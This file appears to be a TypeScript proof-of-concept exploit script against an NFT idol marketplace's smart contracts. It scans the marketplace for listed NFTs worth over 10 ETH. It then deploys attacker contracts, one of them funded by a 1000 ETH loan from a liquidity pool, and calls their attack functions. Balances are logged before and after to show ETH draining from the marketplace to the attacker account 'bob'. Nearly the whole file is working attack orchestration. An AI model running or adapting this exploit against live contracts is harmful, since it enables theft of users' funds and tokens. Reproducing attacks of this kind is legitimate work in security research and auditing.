async function getMarketNFTs(block: number | undefined) {
  let nfts : {[key: number]: [BigNumber, number]} = {}
  const listEvents = await realIdolMarketplaceContract.queryFilter(realIdolMarketplaceContract.filters.GodListed(null, null, null), undefined, block);
  for( const e of listEvents ) {
    const args = e.args
    nfts[args[0].toNumber()] = [args[1], e.blockNumber]
  }
  const unlistEvents = await realIdolMarketplaceContract.queryFilter(realIdolMarketplaceContract.filters.GodUnlisted(null), undefined, block);
  for ( const e of unlistEvents ) {
    const args = e.args
    const nftID = args[0].toNumber()
    if (nfts[nftID] && e.blockNumber > nfts[nftID][1]) {
      delete nfts[nftID]
    }
  }
  let res = []
  let totalValue: BigNumber = BigNumber.from(0)
  let moreThan10ETH = []
  for ( const id in nfts ) {
    res.push(id)
    totalValue = totalValue.add(nfts[id][0])
    if (nfts[id][0].sub(BigNumber.from(10000000000).mul(1000000000)).gt(0)) {
      moreThan10ETH.push(id)
    }
  }
  console.log(moreThan10ETH)
  return { res: res, totalValue: formatEther(totalValue.toString()) }
}

async function loanExploit() {
  console.log("Market: ", await getETHBalance(idolMarketplaceContract.address), "ETH");
  console.log("Bob: ", await getETHBalance(bob.address), "ETH");

  console.log("Exploiting....")
  let nfts = [  // total value: 313.5
    '1005', '1074', '1862', '2008', '2106',
    '2607', '2668', '2700', '3320', '3544',
  ]
  let loanExploitContract = await new LoanExploit__factory(bob).deploy(liquidityPool, borrowerProxy, idolMarketplaceContract.address, idolMainContract.address);
  await loanExploitContract.deployTransaction.wait()
  await loanExploitContract.attack(nfts, parseEther("1000"));

  console.log("Market: ", await getETHBalance(idolMarketplaceContract.address), "ETH");
  console.log("Bob: ", await getETHBalance(bob.address), "ETH");

  for (let nft of nfts) {
    console.log("Owner of", nft, ":", await idolMainContract.ownerOf(nft));
  }
}

async function exploit() {
  let targetNFT = 1426
  console.log("Balance of idol marketplace: ", await getETHBalance(idolMarketplaceContract.address)," ETH")
  console.log("Balance of bob: ", await getETHBalance(bob.address)," ETH")

  if (getAddress(await (await idolMainContract.ownerOf(targetNFT)).toString()) != bob.address) {
    console.log(`Buy idol(${targetNFT}) using 1 ETH`)
    await (await idolMarketplaceContract.buyGod(1426, {value: parseEther("1")})).wait()
  
    console.log("Balance of idol marketplace: ", await getETHBalance(idolMarketplaceContract.address)," ETH")
    console.log("Balance of bob: ", await getETHBalance(bob.address)," ETH")
  }

  let expContract = await new Exploit__factory(bob).deploy()
  await expContract.deployTransaction.wait()
  console.log("\nExploit contract deployed: ", expContract.address)

  await (await idolMainContract.transferFrom(bob.address, expContract.address, targetNFT)).wait()
  console.log(`idol(${targetNFT}) sent to exploit contract.`)

  console.log("exploiting...")

  await (await expContract.attack(targetNFT, {value: parseEther("3")})).wait();

  console.log("Balance of idol marketplace: ", await getETHBalance(idolMarketplaceContract.address)," ETH")
  console.log("Balance of bob: ", await getETHBalance(bob.address)," ETH")
}



async function getETHBalance(address:string) {
  return formatEther(await (await provider.getBalance(address)).toString())
}
